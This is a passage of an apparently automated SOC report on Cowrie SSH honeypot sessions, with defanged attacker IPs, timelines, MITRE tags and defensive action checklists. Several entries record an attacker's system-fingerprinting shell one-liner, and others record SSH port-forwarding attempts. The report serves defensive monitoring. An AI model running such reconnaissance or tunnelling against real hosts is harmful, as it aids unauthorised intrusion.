| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:36` | `cowrie.command.success` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:36` | `cowrie.command.input` |
| `2026-08-23 13:43:37` | `cowrie.log.closed` |
| `2026-08-23 13:43:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62bd925e7dd6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:45 |
| **Last Seen** | 2026-08-23 13:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:45:45` | `cowrie.session.connect` |
| `2026-08-23 13:45:45` | `cowrie.client.version` |
| `2026-08-23 13:45:45` | `cowrie.client.kex` |
| `2026-08-23 13:45:47` | `cowrie.login.success` |
| `2026-08-23 13:45:48` | `cowrie.session.params` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.success` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:48` | `cowrie.command.input` |
| `2026-08-23 13:45:49` | `cowrie.log.closed` |
| `2026-08-23 13:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f461ea2d476

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:45 |
| **Last Seen** | 2026-08-23 13:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:45:55` | `cowrie.session.connect` |
| `2026-08-23 13:45:55` | `cowrie.client.version` |
| `2026-08-23 13:45:55` | `cowrie.client.kex` |
| `2026-08-23 13:45:56` | `cowrie.login.success` |
| `2026-08-23 13:45:56` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:45:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:45:56` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:45:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb798788c54

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:45 |
| **Last Seen** | 2026-08-23 13:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:45:58` | `cowrie.session.connect` |
| `2026-08-23 13:45:58` | `cowrie.client.version` |
| `2026-08-23 13:45:58` | `cowrie.client.kex` |
| `2026-08-23 13:45:59` | `cowrie.login.success` |
| `2026-08-23 13:45:59` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:45:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:45:59` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:46:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-897fe41c7b28

| Field | Detail |
|---|---|
| **Source IP** | `210.4.68[.]72` |
| **First Seen** | 2026-08-23 13:47 |
| **Last Seen** | 2026-08-23 13:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:47:30` | `cowrie.session.connect` |
| `2026-08-23 13:47:31` | `cowrie.client.version` |
| `2026-08-23 13:47:31` | `cowrie.client.kex` |
| `2026-08-23 13:47:33` | `cowrie.login.success` |
| `2026-08-23 13:47:34` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:47:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.4.68[.]72` to AbuseIPDB if not already reported
- [ ] Block `210.4.68[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b02a9c6b529

| Field | Detail |
|---|---|
| **Source IP** | `81.172.74[.]163` |
| **First Seen** | 2026-08-23 13:47 |
| **Last Seen** | 2026-08-23 13:47 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:47:39` | `cowrie.session.connect` |
| `2026-08-23 13:47:39` | `cowrie.client.version` |
| `2026-08-23 13:47:39` | `cowrie.client.kex` |
| `2026-08-23 13:47:41` | `cowrie.login.success` |
| `2026-08-23 13:47:41` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:47:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.172.74[.]163` to AbuseIPDB if not already reported
- [ ] Block `81.172.74[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23b995157fc3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:47 |
| **Last Seen** | 2026-08-23 13:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:47:57` | `cowrie.session.connect` |
| `2026-08-23 13:47:57` | `cowrie.client.version` |
| `2026-08-23 13:47:57` | `cowrie.client.kex` |
| `2026-08-23 13:47:58` | `cowrie.login.success` |
| `2026-08-23 13:48:00` | `cowrie.session.params` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.success` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.command.input` |
| `2026-08-23 13:48:00` | `cowrie.log.closed` |
| `2026-08-23 13:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74c84ced77ed

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:50 |
| **Last Seen** | 2026-08-23 13:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:50:17` | `cowrie.session.connect` |
| `2026-08-23 13:50:17` | `cowrie.client.version` |
| `2026-08-23 13:50:17` | `cowrie.client.kex` |
| `2026-08-23 13:50:18` | `cowrie.login.success` |
| `2026-08-23 13:50:20` | `cowrie.session.params` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.success` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.command.input` |
| `2026-08-23 13:50:20` | `cowrie.log.closed` |
| `2026-08-23 13:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617ec246c042

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:52 |
| **Last Seen** | 2026-08-23 13:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:52:38` | `cowrie.session.connect` |
| `2026-08-23 13:52:38` | `cowrie.client.version` |
| `2026-08-23 13:52:38` | `cowrie.client.kex` |
| `2026-08-23 13:52:39` | `cowrie.login.success` |
| `2026-08-23 13:52:40` | `cowrie.session.params` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.success` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:40` | `cowrie.command.input` |
| `2026-08-23 13:52:41` | `cowrie.log.closed` |
| `2026-08-23 13:52:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-759d02b27b66

| Field | Detail |
|---|---|
| **Source IP** | `83.177.240[.]182` |
| **First Seen** | 2026-08-23 13:52 |
| **Last Seen** | 2026-08-23 13:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:52:43` | `cowrie.session.connect` |
| `2026-08-23 13:52:44` | `cowrie.client.version` |
| `2026-08-23 13:52:44` | `cowrie.client.kex` |
| `2026-08-23 13:52:45` | `cowrie.login.success` |
| `2026-08-23 13:52:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.177.240[.]182` to AbuseIPDB if not already reported
- [ ] Block `83.177.240[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20be510803ed

| Field | Detail |
|---|---|
| **Source IP** | `159.224.97[.]134` |
| **First Seen** | 2026-08-23 13:52 |
| **Last Seen** | 2026-08-23 13:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:52:50` | `cowrie.session.connect` |
| `2026-08-23 13:52:50` | `cowrie.client.version` |
| `2026-08-23 13:52:50` | `cowrie.client.kex` |
| `2026-08-23 13:52:51` | `cowrie.login.success` |
| `2026-08-23 13:52:52` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:52:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.224.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `159.224.97[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06e29680eb00

| Field | Detail |
|---|---|
| **Source IP** | `212.174.62[.]233` |
| **First Seen** | 2026-08-23 13:52 |
| **Last Seen** | 2026-08-23 13:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:52:56` | `cowrie.session.connect` |
| `2026-08-23 13:52:56` | `cowrie.client.version` |
| `2026-08-23 13:52:56` | `cowrie.client.kex` |
| `2026-08-23 13:52:57` | `cowrie.login.success` |
| `2026-08-23 13:52:58` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:53:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.174.62[.]233` to AbuseIPDB if not already reported
- [ ] Block `212.174.62[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e845dfa24599

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-08-23 13:53 |
| **Last Seen** | 2026-08-23 13:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:53:03` | `cowrie.session.connect` |
| `2026-08-23 13:53:04` | `cowrie.client.version` |
| `2026-08-23 13:53:04` | `cowrie.client.kex` |
| `2026-08-23 13:53:07` | `cowrie.login.success` |
| `2026-08-23 13:53:08` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ea2c243518

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 13:54 |
| **Last Seen** | 2026-08-23 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:54:46` | `cowrie.session.connect` |
| `2026-08-23 13:54:46` | `cowrie.client.version` |
| `2026-08-23 13:54:46` | `cowrie.client.kex` |
| `2026-08-23 13:54:47` | `cowrie.login.success` |
| `2026-08-23 13:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c51bb8744fe

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-23 13:54 |
| **Last Seen** | 2026-08-23 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:54:46` | `cowrie.session.connect` |
| `2026-08-23 13:54:46` | `cowrie.client.version` |
| `2026-08-23 13:54:47` | `cowrie.client.kex` |
| `2026-08-23 13:54:47` | `cowrie.login.success` |
| `2026-08-23 13:54:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b95ac530658a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:55 |
| **Last Seen** | 2026-08-23 13:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:55:05` | `cowrie.session.connect` |
| `2026-08-23 13:55:05` | `cowrie.client.version` |
| `2026-08-23 13:55:05` | `cowrie.client.kex` |
| `2026-08-23 13:55:07` | `cowrie.login.success` |
| `2026-08-23 13:55:08` | `cowrie.session.params` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.success` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:08` | `cowrie.command.input` |
| `2026-08-23 13:55:09` | `cowrie.log.closed` |
| `2026-08-23 13:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-038a474a0c73

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:55 |
| **Last Seen** | 2026-08-23 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:55:22` | `cowrie.session.connect` |
| `2026-08-23 13:55:22` | `cowrie.client.version` |
| `2026-08-23 13:55:22` | `cowrie.client.kex` |
| `2026-08-23 13:55:23` | `cowrie.login.success` |
| `2026-08-23 13:55:23` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:55:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:55:23` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f290c0bc64c1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 13:55 |
| **Last Seen** | 2026-08-23 13:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:55:26` | `cowrie.session.connect` |
| `2026-08-23 13:55:26` | `cowrie.client.version` |
| `2026-08-23 13:55:26` | `cowrie.client.kex` |
| `2026-08-23 13:55:27` | `cowrie.login.success` |
| `2026-08-23 13:55:27` | `cowrie.direct-tcpip.request` |
| `2026-08-23 13:55:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 13:55:27` | `cowrie.direct-tcpip.data` |
| `2026-08-23 13:55:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e31e5987137

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 13:57 |
| **Last Seen** | 2026-08-23 13:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 13:57:30` | `cowrie.session.connect` |
| `2026-08-23 13:57:30` | `cowrie.client.version` |
| `2026-08-23 13:57:30` | `cowrie.client.kex` |
| `2026-08-23 13:57:31` | `cowrie.login.success` |
| `2026-08-23 13:57:32` | `cowrie.session.params` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.success` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.command.input` |
| `2026-08-23 13:57:32` | `cowrie.log.closed` |
| `2026-08-23 13:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7aa286385ea

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
